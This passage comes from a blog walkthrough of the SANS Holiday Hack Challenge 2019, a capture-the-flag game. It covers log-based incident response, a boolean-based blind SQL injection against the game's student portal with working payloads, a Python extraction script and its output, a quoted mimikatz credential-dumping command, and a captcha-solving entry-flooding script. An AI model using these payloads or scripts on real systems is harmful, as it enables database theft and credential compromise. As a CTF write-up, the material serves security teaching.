anymore, whereas the catalogue images we used to train our model did. This
might make our Machine Learning model a little bit unreliable. We could modify
our catalogue images to remove the alpha channel, and retrain our model. I
opted to try with my initial model, because I was to impatient to train another
model.

Sure enough, my model was not the most precise, and I had to try a couple of
times. But after four or five tries, my script correctly solved the CAPTEHA:

.. code-block:: console

    $ ./capteha_api.py
    INFO: Initialized TensorFlow Lite runtime.
    CAPTEHA Solved!
    Submitting lots of entries until we win the contest! Entry #1
    Submitting lots of entries until we win the contest! Entry #2
    Submitting lots of entries until we win the contest! Entry #3
    [...]
    Submitting lots of entries until we win the contest! Entry #103
    Submitting lots of entries until we win the contest! Entry #104
    {"data":"<h2 id=\"result_header\"> Entries for email address [REDACTED] no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. <br><br> Congratulations and Happy Holidays!</h2>","request":true}

Few seconds later, I receive an email:

.. image:: /images/sans-christmas-challenge-2019/frido_sleigh_mail.png
    :alt: frido_sleigh_mail.png
    :align: center

We managed to win the contest for Krampus!

Objective 9: 
~~~~~~~~~~~~
Pepper Minstix's Cranberry Pi Challenge
---------------------------------------

We must take a look at logs in Graylog to find weird events and answer
questions.

1. Minty CandyCane reported some weird activity on his computer after he
   clicked on a link in Firefox for a cookie recipe and downloaded a file. What
   is the full-path + filename of the first malicious file downloaded by Minty?

Let's search events with :code:`UserAccount:minty`. Luckily, one of the `first
results <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=source%2CCommandLine%2Cmessage&width=1853&highlightMessage=&relative=0&q=UserAccount%3Aminty>`__
looks like a malicious file, :code:`C:\Users\minty\Downloads\cookie_recipe.exe`.

2. The malicious file downloaded and executed by Minty gave the attacker remote
   access to his machine. What was the **ip:port** the malicious file connected
   to first?

Now, we can look for :code:`cookie_recipe.exe` and events with a
:code:`DestinationIp` attribute. `This query <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=source%2CCommandLine%2Cmessage&width=1853&highlightMessage=&relative=0&q=cookie_recipe.exe%20AND%20UserAccount%3Aminty%20AND%20_exists_%3ADestinationIp>`__
has only one result. The :code:`ip:port` is :code:`192.168.247.175:4444`.

3. What was the first command executed by the attacker?

If we keep looking for :code:`cookie_recipe.exe`, we can `see <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=source%2CCommandLine%2Cmessage&width=1853&highlightMessage=&relative=0&q=cookie_recipe.exe>`__ the commands launched by the
attacker. The first one is :code:`whoami`.

4. What is the one-word service name the attacker used to escalate privileges?

Still looking at :code:`cookie_recipe.exe`, we see the interaction with a
Windows service with the :code:`sc` command. The service is called
:code:`webexservice`.

5. What is the file-path + filename of the binary ran by the attacker to dump credentials?

If we take a look at the :code:`webexservice` service, we can
`see <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=source%2CCommandLine%2Cmessage&width=1853&highlightMessage=&relative=0&q=webexservice>`__
the creation of another executable, :code:`cookie_recipe2.exe`. Let's look for
this executable. The
`results <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=source%2CCommandLine%2Cmessage&width=1853&highlightMessage=&relative=0&q=cookie_recipe2.exe>`__
show that the attacker downloaded :code:`mimikatz` from `gentilkiwi's GitHub
repository <https://github.com/gentilkiwi>`__.

Let's look for :code:`mimikatz`. The
`results <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=source%2CCommandLine%2Cmessage&width=1853&highlightMessage=&relative=0&q=mimikatz>`__
show that a command line :code:`"C:\cookie.exe" privilege::debug sekurlsa::logonpasswords exit`
was launched. The :code:`mimikatz` executable was therefore saved under
:code:`C:\cookie.exe`.

6. The attacker pivoted to another workstation using credentials gained from
   Minty's computer. Which account name was used to pivot to another machine?

Now, we know the attacker's IP is :code:`192.168.247.175`. We also know from
the analysis of the password spraying attack, that the Event ID for a correct
authentication is 4624. Let's look for this Event ID, tied to this IP address.
The
`results <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=source%2CCommandLine%2CLogonType%2Cmessage&width=1853&highlightMessage=&relative=0&q=EventID%3A4624%20AND%20192.168.247.175>`__
all have the same :code:`AccountName` attribute, :code:`alabaster`.

7. What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection
   to another machine?

Now, I had a hard time answering this one. I `looked for events <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=message%2Csource&width=1853&highlightMessage=&relative=0&q=DestinationPort%3A3389>`__
with :code:`DestinationPort:3389`, and submitted the four different timestamps.
However, they were not the correct one. I thought that maybe I should submit
them with their UTC value, but to no avail.

I then tried bruteforcing every value between :code:`05:59:00` and
:code:`06:02:00`, but it was also a fail.

Finally, I manually tried every timestamp for the query `EventID:4624 AND
DestinationHostname:"elfu-res-wks2" <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=message%2Csource&width=1853&highlightMessage=&relative=0&q=EventID%3A4624%20AND%20DestinationHostname%3Aelfu%5C-res%5C-wks2>`__
after :code:`05:59:00`.

Turns out the correct one is :code:`06:04:28`. After inputing the correct
answer, the report tells you:

    LogonType 10 is used for successful network connections using the RDP
    client.

So, I guess I should have looked for :code:`LogonType:10`, which indicates that
the connection is fully complete, whereas my first four timestamps were just
the establishment of the TCP connection.

8. The attacker navigates the file system of a third host using their Remote
   Desktop Connection to the second host. What is the **SourceHostName,DestinationHostname,LogonType**
   of this connection?

Now, we know that the second host is :code:`elfu-res-wks2`. If we keep looking
for Event ID 4624 with this :code:`SourceHostName`, we
`find <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=message%2Csource&width=1853&highlightMessage=&relative=0&q=SourceHostName%3A%22ELFU-RES-WKS2%22%20AND%20EventID%3A4624>`__
two values for :code:`DestinationHostname`: :code:`elfu-res-wks2` (our 
original workstation) or :code:`elfu-res-wks3`. The latter must be our third
host.

Let's add :code:`DestinationHostname="elfu-res-wks3"` to our previous query to
see the possible value for :code:`LogonType`. We
`find <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=message%2Csource&width=1853&highlightMessage=&relative=0&q=SourceHostName%3A%22ELFU-RES-WKS2%22%20AND%20EventID%3A4624%20AND%20DestinationHostname%3A%22elfu-res-wks3%22>`__
that the onlye :code:`LogonType` is :code:`3`.

Therefore, the CSV result is :code:`elfu-res-wks2,elfu-res-wks3,3`.

9. What is the full-path + filename of the secret research document after being
   transferred from the third host to the second host?

Now, we can specify a :code:`source="elfu-res-wks2"` and look for file
creation. `This query <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=message%2Csource&width=1853&highlightMessage=&relative=0&q=source%3D%22elfu-res-wks2%22%20AND%20_exists_%3ATargetFilename>`__
returns a few results. By looking through it, we can find the file
:code:`C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf`.

10. What is the IPv4 address (as found in logs) the secret research document
    was exfiltrated to?

If we `look for this file name <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=message%2Csource&width=1853&highlightMessage=&relative=0&q=super_secret_elfu_research.pdf>`__,
we can see that the file was exfiltraded to pastebin.com, via a PowerShell
command, with a PID of 1232. Let's look for this PID, and list the different
:code:`DestinationIp` it communicated with.

`This query <https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&fields=message%2Csource&width=1853&highlightMessage=&relative=0&q=ProcessId%3A1232%20AND%20_exists_%3ADestinationIp>`__
gives us only one IP address: :code:`104.22.3.84`.

Now that we have answered every question, we get the following message:

    Incident Response Report #7830984301576234 Submitted.

    Incident Fully Detected!


Retrieve Scraps of Paper from Server
------------------------------------

Krampus is super happy that we managed to win the Frido Sleigh contest for him!

.. image:: /images/sans-christmas-challenge-2019/small_krampus.png
    :alt: krampus.png
    :align: center

*Krampus says*

    You did it! Thank you so much. I can trust you!

    To help you, I have flashed the firmware in your badge to unlock a useful
    new feature: magical teleportation through the steam tunnels.

    As for those scraps of paper, I scanned those and put the images on my
    server.

    I then threw the paper away.

    Unfortunately, I managed to lock out my account on the server.

    Hey! You’ve got some great skills. Would you please hack into my system and
    retrieve the scans?

    I give you permission to hack into it, solving Objective 9 in your badge.

    And, as long as you're traveling around, be sure to solve any other
    challenges you happen across.

So, we must hack Krampus' system to recover the scraps of paper. Let's head
over to the `Student Portal <https://studentportal.elfu.org/>`__ and see what
we can do.

The portal presents the university, the different elvish students, and the
application process. It's possible to `send an application <https://studentportal.elfu.org/apply.php>`__
and `check our application's status <https://studentportal.elfu.org/check.php>`__.

Let's see what we can do on these pages:

.. code-block:: http

    GET /validator.php HTTP/1.1
    Host: studentportal.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
    Accept: */*

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Content-Length: 89

    MTAwOTkwNTY5MjE2MTU3Nzk3NzY0NDEwMDk5MDU2OS4yMTY=_MTI5MjY3OTI4NTk2NDgzMjMxNjk4MjE0LjkxMg==

.. code-block:: http

    GET /application-check.php?elfmail=test@test.com'&token=MTAwOTkwNTY5MjE2MTU3Nzk3NzY0NDEwMDk5MDU2OS4yMTY%3D_MTI5MjY3OTI4NTk2NDgzMjMxNjk4MjE0LjkxMg%3D%3D HTTP/1.1
    Host: studentportal.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

.. code-block:: http
    :hl_lines: 6

    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Content-Length: 2927

    [...]
    Error: SELECT status FROM applications WHERE elfmail = 'test@test.com'';<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''test@test.fr''' at line 1

Couple of interesting things:

* First, we can see that before every submission to the form, a call is made to
  https://studentportal.elfu.org/validator.php to get a validation token, that
  must be sent to the https://studentportal.elfu.org/application-check.php URL.
* Second, we have a SQL injection! What's more, the error message is pretty
  chatty, and gives us the complete SQL statement:

.. code-block:: sql

    SELECT status FROM applications WHERE elfmail = '<user_input_goes_here>';

We can use this SQL injection to dump the content of the database. However,
this does not look to be a `UNION-exploitable SQL injection <http://www.sqlinjection.net/union/>`__.
However, it seems that it could be a `boolean-based blin SQL injection <https://www.owasp.org/index.php/Blind_SQL_Injection>`__.

Let's say we use this as our user input:

::

    garbage@garbage.com' OR '1'='1

The SQL statement becomes:

.. code-block:: sql

    SELECT status FROM applications WHERE elfmail = 'garbage@garbage.com' OR '1'='1';

The :code:`WHERE` part of the statement will always be true, because of the
:code:`OR '1'='1'` part. So, it will return the status of the first
application, which is still pending:

.. code-block:: http

    GET /application-check.php?elfmail=garbage%40garbage.com'+OR+'1'%3d'1&token=MTAwOTkwNjMxMTY4MTU3Nzk3ODYxMjEwMDk5MDYzMS4xNjg%3D_MTI5MjY4MDA3ODk1MDQzMjMxNzAwMTk3LjM3Ng%3D%3D HTTP/1.1
    Host: studentportal.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Content-Type: text/html; charset=UTF-8
    Content-Length: 2723

    [...]
    Your application is still pending!
    [...]

Now, if we use this as our user input:

::

    garbage@garbage.com' OR '1'='0

The SQL statement becomes:

.. code-block:: sql

    SELECT status FROM applications WHERE elfmail = 'garbage@garbage.com' OR '1'='0';

Now, the :code:`OR` clause in our :code:`WHERE` statement is always false
(because 1 is never equal to 0). So the statement will return the status for
our email address :code:`garbage@garbage.com`, which does not exist in the
database. Therefore, our application is not found:

.. code-block:: http

    GET /application-check.php?elfmail=garbage%40garbage.com'+OR+'1'%3d'0&token=MTAwOTkwNjMzOTg0MTU3Nzk3ODY1NjEwMDk5MDYzMy45ODQ%3D_MTI5MjY4MDExNDk5NTIzMjMxNzAwMjg3LjQ4OA%3D%3D HTTP/1.1
    Host: studentportal.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Content-Type: text/html; charset=UTF-8
    Content-Length: 2710

    [...]
    No application found!
    [...]

We now have a way to evaluate boolean statements. If our statement is true,
the server will return "Your application is still pending!". If it's false, it
will return "No application found!".

Let's say we want to find the first letter of the current database. We can
input:

::

    garbage@garbage.com' OR (SELECT MID(DATABASE(),0,1))='a

If the first letter is :code:`a`, the server will answer "Your application is
still pending!". If not, it will answer "No application found!":

.. code-block:: http

    GET /application-check.php?elfmail=garbage%40garbage.com'+OR+(SELECT+MID(DATABASE(),1,1))%3d'a&token=MTAwOTkwNjc5NDI0MTU3Nzk3OTM2NjEwMDk5MDY3OS40MjQ%3D_MTI5MjY4MDY5NjYyNzIzMjMxNzAxNzQxLjU2OA%3D%3D HTTP/1.1
    Host: studentportal.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Content-Type: text/html; charset=UTF-8
    Content-Length: 2710

    [...]
    No application found!
    [...]

So, the first letter is not :code:`a`. We keep trying letters, until finally:

.. code-block:: http

    GET /application-check.php?elfmail=garbage%40garbage.com'+OR+(SELECT+MID(DATABASE(),1,1))%3d'e&token=MTAwOTkwNjc5NDI0MTU3Nzk3OTM2NjEwMDk5MDY3OS40MjQ%3D_MTI5MjY4MDY5NjYyNzIzMjMxNzAxNzQxLjU2OA%3D%3D HTTP/1.1
    Host: studentportal.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Content-Type: text/html; charset=UTF-8
    Content-Length: 2710

    [...]
    Your application is still pending!
    [...]

So, the first letter of the database is :code:`e`. We can now find the next
letter. If we keep going, we'll find that the data base is :code:`elfu`.

Awesome, we can extract information from the database! Let's automate the
process, because doing this manually takes too much time. Luckily for me, I've
written in the past `a little Python script <https://github.com/the-useless-one/blind_injection>`__
to help me exploit blind SQL injection. We just have to make a few
modifications to the :code:`injection.py` file, to modify the syntax of the
injection, and to call the validator URL to get our validation token before
every request:

.. code-block:: python

    def injection(target_url, string, column, table, where, index):
        token_url = 'https://studentportal.elfu.org/validator.php'

        print('[wait] retrieving data:', end='\t')
        sys.stdout.flush()
        data = ''
        i = 1

        # While we don't have the entire data
        while True:
            char = 0
            for j in range(1,8):
                # The injection performed here is URL-based
                # To use another mean of injection (HTTP Headers, Cookies...)
                # change the crafting between the hashtags

                #### CHANGE HERE
                r = requests.get(token_url)
                token = r.text

                if '?' in target_url:
                    separator = '&'
                else:
                    separator = '?'

                url = target_url + separator + "elfmail=garbage@garbage.com' OR " + \
                        "(select mid(lpad(bin(ord(mid({0},{1},1))),7,'0'),{2},1) " + \
                        "from {3} {4} " + \
                        "limit {5},1)='1&token={6}"
                url = url.format(column, i, j, table, where, index, token)

                r = requests.get(url)
                #### END OF CHANGE

Now, you can see that the syntax of the injection is a little bit different
from what I show earlier. Let's break it down:

.. code-block:: sql

    SELECT MID(LPAD(BIN(ORD(MID(<column_name>,<index_i>,1))),7,'0'),<index_j>,1) FROM <table_name>

* I first call :code:`MID` to retrieve a particular character from the data.

* I then call :code:`ORD`, to get the ASCII code of this letter.

* I then call :code:`BIN`, to convert this ASCII code to binary.

* Then, I call :code:`LPAD(___, 7, '0')` to pad this binary string with zeros,
  until it has a length of 7.

* I then call :code:`MID` again, to extract a particular bit from this binary
  string.

* I then test to see if this bit is equal to one or not.

This allows me to retrieve the string I'm interested in bit by bit, instead of
character by character. It's a little bit faster.

So, let's run this script to retrieve information from the database. First,
let's get the different tables for the :code:`elfu` database:

.. code-block:: shell
    :hl_lines: 5 10 15

    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c table_name -t information_schema.tables -w "WHERE table_schema='elfu'" -i 0
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    applications
    found: applications
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c table_name -t information_schema.tables -w "WHERE table_schema='elfu'" -i 1
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    krampus
    found: krampus
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c table_name -t information_schema.tables -w "WHERE table_schema='elfu'" -i 2
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    students
    found: students
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c table_name -t information_schema.tables -w "WHERE table_schema='elfu'" -i 3
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:
    no result found

Alright, the table :code:`krampus` seems interesting. Let's see the columns of
this table:

.. code-block:: shell
    :hl_lines: 5 10

    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c column_name -t information_schema.columns -w "WHERE table_name='krampus'" -i 0
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data: id
    found: id
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c column_name -t information_schema.columns -w "WHERE table_name='krampus'" -i 1
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data: path
    found: path
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c column_name -t information_schema.columns -w "WHERE table_name='krampus'" -i 2
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:
    no result found

Two columns, :code:`id` and :code:`path`. Let's extract data from the
:code:`path` column:

.. code-block:: shell

    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c path -t krampus -i 0
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    /krampus/0f5f510e.png
    found: /krampus/0f5f510e.png
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c path -t krampus -i 1
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    /krampus/1cc7e121.png
    found: /krampus/1cc7e121.png
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c path -t krampus -i 2
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    /krampus/439f15e6.png
    found: /krampus/439f15e6.png
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c path -t krampus -i 3
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    /krampus/667d6896.png
    found: /krampus/667d6896.png
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c path -t krampus -i 4
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    /krampus/adb798ca.png
    found: /krampus/adb798ca.png
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c path -t krampus -i 5
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:    /krampus/ba417715.png
    found: /krampus/ba417715.png
    $ ./blind_injection.py -u "https://studentportal.elfu.org/application-check.php" -s 'still pending!' -c path -t krampus -i 6
    Blind Injection (Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>)

    [done] retrieving data:
    no result found

We found six different paths to PNG files. We can download them from the
Student Portal. Weirdly enough, I couldn't download these files from my
browser, I had to download them using :code:`wget`. Anyway, here are the six
scraps of paper we were searching:

* `First scrap </images/sans-christmas-challenge-2019/0f5f510e.png>`__
* `Second scrap </images/sans-christmas-challenge-2019/1cc7e121.png>`__
* `Third scrap </images/sans-christmas-challenge-2019/439f15e6.png>`__
* `Fourth scrap </images/sans-christmas-challenge-2019/667d6896.png>`__
* `Fifth scrap </images/sans-christmas-challenge-2019/adb798ca.png>`__
* `Sixth scrap </images/sans-christmas-challenge-2019/ba417715.png>`__

We can try to reconstruct the full letter in GIMP, by moving the pieces:

.. image:: /images/sans-christmas-challenge-2019/letter.png
    :alt: letter.png
    :align: center

Here's what it says:

    From the Desk of [...]

    Date: August 23, 20[...]

    Memo to Self:

    Finally! I've figured out how to destroy Christmas! Santa has a brand new
    cutting edge sleigh guidance technology, called the Super Sled-o-matic.

    I've figured out a way to poison the data going into the system so that it
    will divert Santa's sled on Christmas Eve!

    Santa will be unable to make the trip and the holiday season will be
    destroyed! Santa's own technology will undermine him!

    That's what they deserve for not listening to my suggestions for supporting
    other holiday characters!

    Bwahahahahaha!

The upper-right corner is torn, so we can't say who it's from. But the
background drawing looks `familiar <https://en.wikipedia.org/wiki/Human_tooth>`__...

Objective 10: 
~~~~~~~~~~~~~
Holly Evergreen's Cranberry Pi Challenge
----------------------------------------

We must help Holly find the information she's looking for in MongoDB:

.. code-block:: console

    Hello dear player!  Won't you please come help me get my wish!
    I'm searching teacher's database, but all I find are fish!
    Do all his boating trips effect some database dilution?
    It should not be this hard for me to find the quiz solution!

    Find the solution hidden in the MongoDB on this system.

    elf@c6444428f1f4:~$

Let's try to connect to MongoDB:

.. code-block:: console
    :hl_lines: 11

    elf@c6444428f1f4:~$ mongo
    MongoDB shell version v3.6.3
    connecting to: mongodb://127.0.0.1:27017
    2019-12-24T11:54:26.073+0000 W NETWORK  [thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll), reason: Connection refused
    2019-12-24T11:54:26.073+0000 E QUERY    [thread1] Error: couldn't connect to server 127.0.0.1:27017, connection attempt failed :
    connect@src/mongo/shell/mongo.js:251:13
    @(connect):1:6
    exception: connect failed


    Hmm... what if Mongo isn't running on the default port?

We can't seem to connect to MongoDB on the default port. As the hint suggests,
maybe it's running on a different port:

.. code-block:: console
    :hl_lines: 5

    elf@c6444428f1f4:~$ netstat -tlpn
    (No info could be read for "-p": geteuid()=1001 but you should be root.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.1:12121         0.0.0.0:*               LISTEN      -                   

Alright, there seems to be a program listening on port 12121. Let's try that:

.. code-block:: console

    elf@c6444428f1f4:~$ mongo --port 12121
    MongoDB shell version v3.6.3
    connecting to: mongodb://127.0.0.1:12121/
    MongoDB server version: 3.6.3
    Welcome to the MongoDB shell.
    For interactive help, type "help".
    For more comprehensive documentation, see
            http://docs.mongodb.org/
    Questions? Try the support group
            http://groups.google.com/group/mongodb-user
    Server has startup warnings: 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
    2019-12-24T11:53:42.670+0000 I CONTROL  [initandlisten] 

It's working! Let's list the available databases:

::

    > show dbs
    admin   0.000GB
    config  0.000GB
    elfu    0.000GB
    local   0.000GB
    test    0.000GB

Hmm, it might take a while to search in all these databases. They don't seem
to be particularly heavy. Maybe we can dump them all and search for the
solution using regular shell tools. We can dump the content of MongoDB using
:code:`mongodump`:

.. code-block:: console

    elf@c6444428f1f4:~$ mongodump --port 12121
    2019-12-24T11:59:43.690+0000    writing admin.system.version to 
    2019-12-24T11:59:43.691+0000    done dumping admin.system.version (1 document)
    2019-12-24T11:59:43.691+0000    writing elfu.metadata to 
    2019-12-24T11:59:43.691+0000    writing elfu.line to 
    2019-12-24T11:59:43.691+0000    writing elfu.tincan to 
    2019-12-24T11:59:43.692+0000    writing elfu.solution to 
    2019-12-24T11:59:43.692+0000    done dumping elfu.line (1 document)
    2019-12-24T11:59:43.692+0000    writing elfu.bait to 
    2019-12-24T11:59:43.692+0000    done dumping elfu.metadata (15 documents)
    2019-12-24T11:59:43.692+0000    writing elfu.tackle to 
    2019-12-24T11:59:43.693+0000    done dumping elfu.bait (1 document)
    2019-12-24T11:59:43.693+0000    done dumping elfu.tackle (1 document)
    2019-12-24T11:59:43.693+0000    writing elfu.chum to 
    2019-12-24T11:59:43.693+0000    writing test.redherring to 
    2019-12-24T11:59:43.693+0000    done dumping elfu.tincan (1 document)
    2019-12-24T11:59:43.693+0000    done dumping elfu.chum (1 document)
    2019-12-24T11:59:43.740+0000    done dumping test.redherring (1 document)
    2019-12-24T11:59:43.740+0000    done dumping elfu.solution (1 document)

Now that everything is dumped, let's take a loot at the available files:

.. code-block:: console
    :hl_lines: 23

    elf@c6444428f1f4:~$ ls -lR dump/
    dump/:
    total 12
    drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 admin
    drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 elfu
    drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 test

    dump/admin:
    total 8
    -rw-r--r-- 1 elf elf  59 Dec 24 11:59 system.version.bson
    -rw-r--r-- 1 elf elf 134 Dec 24 11:59 system.version.metadata.json

    dump/elfu:
    total 56
    -rw-r--r-- 1 elf elf   19 Dec 24 11:59 bait.bson
    -rw-r--r-- 1 elf elf  123 Dec 24 11:59 bait.metadata.json
    -rw-r--r-- 1 elf elf   19 Dec 24 11:59 chum.bson
    -rw-r--r-- 1 elf elf  123 Dec 24 11:59 chum.metadata.json
    -rw-r--r-- 1 elf elf   31 Dec 24 11:59 line.bson
    -rw-r--r-- 1 elf elf  123 Dec 24 11:59 line.metadata.json
    -rw-r--r-- 1 elf elf 3147 Dec 24 11:59 metadata.bson
    -rw-r--r-- 1 elf elf  127 Dec 24 11:59 metadata.metadata.json
    -rw-r--r-- 1 elf elf  116 Dec 24 11:59 solution.bson
    -rw-r--r-- 1 elf elf  127 Dec 24 11:59 solution.metadata.json
    -rw-r--r-- 1 elf elf   24 Dec 24 11:59 tackle.bson
    -rw-r--r-- 1 elf elf  125 Dec 24 11:59 tackle.metadata.json
    -rw-r--r-- 1 elf elf   23 Dec 24 11:59 tincan.bson
    -rw-r--r-- 1 elf elf  125 Dec 24 11:59 tincan.metadata.json

    dump/test:
    total 8
    -rw-r--r-- 1 elf elf  59 Dec 24 11:59 redherring.bson
    -rw-r--r-- 1 elf elf 129 Dec 24 11:59 redherring.metadata.json

The :code:`dump/elfu/solution.bson` file seems promising. Let's check it:

.. code-block:: console

    elf@c6444428f1f4:~$ cat dump/elfu/solution.bson        
    t_id fYou did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **

Alright, we're now supposed to run a command in MongoDB. Let's connect back to
it:

.. code-block:: console
    :hl_lines: 14 16

    elf@c6444428f1f4:~$ mongo --port 12121
    MongoDB shell version v3.6.3
    connecting to: mongodb://127.0.0.1:12121/
    MongoDB server version: 3.6.3
    Server has startup warnings: 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] 
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.
    2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
    2019-12-24T11:53:42.670+0000 I CONTROL  [initandlisten] 
    > use elfu
    switched to db elfu
    > db.loadServerScripts();displaySolution();

           __/ __
                /
           /.'o'. 
            .o.'.
           .'.'*'.
          o'.*.'.*.
         .'.o.'.'.*.
        .o.'.o.'.o.'.
           [_____]
            ___/


      Congratulations!!

Recover Cleartext Document
--------------------------

.. image:: /images/sans-christmas-challenge-2019/small_krampus.png
    :alt: small_krampus.png
    :align: center

*Krampus says*

    Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.

    We’ve gotta stop whomever is behind it!

    I managed to find `this protected document </docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc>`__
    on one of the compromised machines in our environment.

    I think our attacker was in the process of exfiltrating it.

    I’m convinced that it is somehow associated with the plan to destroy the
    holidays. Can you decrypt it?

    There are some smart people in the NetWars challenge room who may be able
    to help us.

So, we have what seems to be an encrypted PDF that we need to decrypt. We're
